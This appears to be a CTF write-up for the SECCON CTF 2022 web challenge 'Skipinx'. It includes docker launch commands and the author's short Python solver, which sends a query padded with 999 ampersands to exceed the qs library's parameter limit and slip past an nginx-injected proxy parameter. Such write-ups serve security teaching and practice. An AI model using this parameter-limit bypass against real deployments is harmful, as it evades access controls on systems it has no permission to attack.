---
title: "Skipinx - SECCON CTF 2022 Quals"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "nginx", "skipinx", "web", "seccon-ctf-2022-quals"]
summary: "ALL YOU HAVE TO DO IS SKIP NGINX"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202211_SECCON_CTF_2022_Quals/web/skipinx"
license: "none stated"
ctf:
  name: "SECCON CTF 2022 Quals"
  year: 2022
  challenge: "Skipinx"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202211_SECCON_CTF_2022_Quals/web/skipinx>
- **CTF:** SECCON CTF 2022 Quals

---

# [web] skipinx

## Description

ALL YOU HAVE TO DO IS SKIP NGINX

- `http://skipinx.seccon.games:8080`

## Attachments

- [skipinx](files/skipinx)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:

```
docker run -it \
    -e SECCON_HOST=localhost \
    -e SECCON_PORT=8080 \
    --network=host \
    (docker build -q ./solver)
```


## Solver: `solver.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202211_SECCON_CTF_2022_Quals/web/skipinx/solver/solver.py>

```python
import os
import httpx

BASE_URL = f"http://{os.getenv('SECCON_HOST')}:{os.getenv('SECCON_PORT')}"

# ref. https://github.com/ljharb/qs/blob/v6.11.0/lib/parse.js#L21
PARAMETER_LIMIT = 1000

query = "proxy=something" + ("&"*(PARAMETER_LIMIT - 1))
res = httpx.get(f"{BASE_URL}/?{query}")
print(res.text)
```
